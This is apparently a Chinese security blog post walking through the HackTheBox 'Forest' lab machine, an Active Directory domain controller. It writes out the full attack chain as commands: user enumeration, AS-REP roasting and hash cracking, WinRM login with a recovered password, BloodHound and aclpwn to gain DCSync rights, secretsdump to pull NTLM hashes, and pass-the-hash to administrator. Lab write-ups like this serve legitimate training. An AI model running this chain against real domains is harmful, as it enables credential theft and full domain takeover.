> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KfsEqlqSv0h57OpyHz1aAQ)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **85** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/212

靶机难度：中级（4.6/10）

靶机发布日期：2020 年 3 月 17 日

靶机描述：

Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange

Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to

enumerate domain objects. The password for a service account with Kerberos pre-authentication

disabled can be cracked to gain a foothold. The service account is found to be a member of the

Account Operators group, which can be used to add users to privileged Exchange groups. The

Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the

NTLM hashes.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

  

  

一、信息收集

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQguyaMxaGZe0YK7AJiaLQMfmup8NWotibgJpdvk9FCCyhXRxf9gYyibjXw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.161....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQKTsrGPpZE3yN2FXRMRTvbUGcwxYhFU8EicL15rhM3BkHmp8JsCficmPg/640?wx_fmt=png)

可以看到该计算机是 HTB.LOCAL 域的域控服务器...

nmap 发现开放了很多端口... 这里重要的是 SMB（445），Kerberos（88），LDAP / S（389/636）和 WinRM（5985）等...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQ0UcOibAX4kNJkNOXHAicaYLEZ7RUJlq56vdlicKyxqag5JwIwQcL1mo8g/640?wx_fmt=png)

```
enum4linux -a forest.htb
```

利用 enum4linux 枚举 windows 系统信息...（非常好的工具），可看到枚举了所有信息，其中包含了所有的用户名...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQXiae8MhkaSTdEK3LXJAZxiaUNbMDwW3mBWyyYRC45c6MicBEpPjbcbR3Q/640?wx_fmt=png)

```
cat user.txt | awk -F ":" '{print $5}' | awk -F " " '{print $1}' > userlist.txt
```

将所有信息复制到文本，通过 awk 筛选出重要信息即可... 清晰的得到了所有存在的用户名列表...

这里针对 AD 域的环境，还可以利用：

```
[rpcclient](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)（kali自带）
[JXplorer](http://jxplorer.org/)
```

MSF 的 smb_enumusers 模块等等方法枚举到信息...  

小伙伴们可以全部尝试一遍...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQIe2hLs2mBe5Ob5sBwwFbfgFFIZ79yEArsRcbpksZTZiaKpGPGpRebdg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQ7Du8iclX9qTNCoicqxO3HpgZZH7GoX21VFz7eOmgTT62AXrANmWz2Hqg/640?wx_fmt=png)

```
./GetNPUsers.py HTB/ -usersfile userlist.txt -no-pass -dc-ip forest.htb
```

通过整理好的用户名列表，利用：

```
[Kerberos](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
```

理论中介绍的 impacket-GetUserSPNs 进行了预身份认证...   （这里介绍 Kerberos 是里面还包含了很多方法，供大家累积）  

最后一个 svc-alfresco 用户返回了 hash 密匙凭证...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQEMXrZBEiaDLib4sibn8578UWlhiauKS9Oe3OTN2eVfEibUu0ZwNSd9HZ9cQ/640?wx_fmt=png)

```
hashcat -m 18200 hash.txt rockyou.txt --force
```

利用 hashcat 工具 rockyou 字典爆破 hash 值，获得了密码...（这里也可以利用开膛手爆破）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQz4c97tC9UmcqyerdibW4LEkuV6WSz6Vbric2aofbiaYtuMzicdNiaygMPJQ/640?wx_fmt=png)

通过 winRM 服务，利用 Evil-WinRM 工具进行成功登陆，并获得 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQLMHOT9jibBT1E2JGlOFyD0RcR2ibjklfpDTmtqD7lOSTxWcicZliaOf6AQ/640?wx_fmt=png)

```
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

由于是 AD 域环境，最快获取 AD 域中特权关系利用：

```
[SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)
```

来获得提权图形化界面包...  

成功获得了包含域信息的 zip 文件... 下载到本地...

前提需要部署 BloodHound 环境，

```
apt update && apt install bloodhound -y
```

下载即可... 后续自行摸索  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQxycO5qPSbjv9EPKscNIZfYe31st3pqyufyUotgyuibe2Kh0Zd0kLf1g/640?wx_fmt=png)

```
neo4j console`  启用  `bloodhound
```

通过前面获取的域信息文件... 拖入 BloodHound 中，展示了路线图... 查找管理员的最短路径...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQfrBKtc26jveF1gJFUTaJWwRibfn2YWiaTqHCTgfZXcugtCFGrbzBFM9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQdP5pWpqIFEPSmfYx6XCMJJiaZ8UnMByPvgp2V9qpcuxibAGwu6Aumo0w/640?wx_fmt=png)

通过展示和优化查找...BloodHound 提供了最有路线和方法...

该路径显示，从当前的 svc-alfresco 帐户中，可以使用 “服务帐户” 组的成员身份。“服务帐户”的每个成员都继承 “特权 IT 帐户” 组的权限。“特权 IT 帐户组”的每个成员也是 “帐户运营商” 的成员。“帐户操作员”享受与 “ Exchange Windows 权限” 相关的所有权限，基本上就是所有权限....

Exchange Windows 权限组对 Active Directory 中的 Domain 对象具有 WriteDacl 访问权限，这意味着该组的任何成员都可以修改域特权！！！非常重要的信息...

以及方式方法都列举了出来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQnQz9zbfP5VvDVeIibKG4OqibyxcsKkEpEwDaHXRyXowaDerJ3RbV6kWQ/640?wx_fmt=png)

```
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
New-ADUser dayu -AccountPassword $pass -Enabled $True
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members dayu
net group 'Exchange Windows Permissions
```

这里可以创建新的用户名...dayu

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQ7OejnZlbGNIPfork0KdqLHjqBcMic2VltbibSibPaUIWMCmpP1Vrj6jRg/640?wx_fmt=png)

```
net group "Exchange Windows Permissions" svc-alfresco /add
```

也可以利用自身用户名创建...

或者利用 net user 等等方法，只要可以创建都可以利用原则上的思路进行...

前面可以看到 svc-alfresco 已经是 “SERVICE ACCOUNTS” 组的成员，并且该组本身属于 “ PRIVILEGED IT ACCOUNTS” 组，后者属于 “ ACCOUNT OPERATORS” 组...

只需将其添加到 “EXCHANGE WINDOWS PERMISSIONS” 组中，然后为其赋予 DCSync 权限...

DCSync 是一种旨在通过执行以下操作来转储域用户的标识符的攻击... 需要深入了解的 [google](https://adsecurity.org/?p=1729)...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQia8wEZk4GatvajEEicBvZXtPSQ1mXPPPyYMdo3CTZWLhGROnB40OP3iag/640?wx_fmt=png)

```
aclpwn -f svc-alfresco -ft user -d htb.local
```

需要提前部署 pip install aclpwn...

利用 Aclpwn 使用 Sharphound 生成的转储通过 Active Directory 中的关系自动提升用户...

或者利用 Bloodhound 提供使用 Powersploit 项目中的 PowerView 的功能...（需要上传 PowerView... 然后打通 HTB 域即可）

还是利用了 aclpwn... 可以看到 aclpwn 发现了两种提高 svc-alfresco 的方法... 成功更新了组策略...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQicsHV499CoJL7tC9ICbkEhEASB3MicHfSsiacCmmdSOvKUIDCdtxYibsyA/640?wx_fmt=png)

```
secretsdump.py svc-alfresco:s3rvice@forest.htb
```

这里可以利用很多方法，例如可以直接在目标上使用 Mimikatz，也可以在 Impacket 中使用 Invoke-DCSync 或 secretsdump.py，还有 ntlmrelayx.py 等等...

这里我运行 secretsdump.py 来执行 DCSync 并拉回哈希值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQqsXwstWKX2D5oLzwl7RqxgROMeH20e8ZTOyULnaia5HtNhrmks4rQoQ/640?wx_fmt=png)

利用 evil-winrm 获得的 administrator 哈希值成功获得了 root 信息...

还可以利用 psexec 和 wmiexec 等多种方法进行登录....

需要深入的小伙伴还可以利用前面获得的各种用户的 hash 值进去深入了解一些信息... 还有一些有趣的信息...

这是一台评分中级的靶机，作者却给了 easy 的评价... 我的感觉简单到中级之间吧~~

学到了挺多的...

现在做一台少一台... 越来越珍惜环境... 希望能用各种不同的方法来拿下一台靶机... 加油~~~

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台中等的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)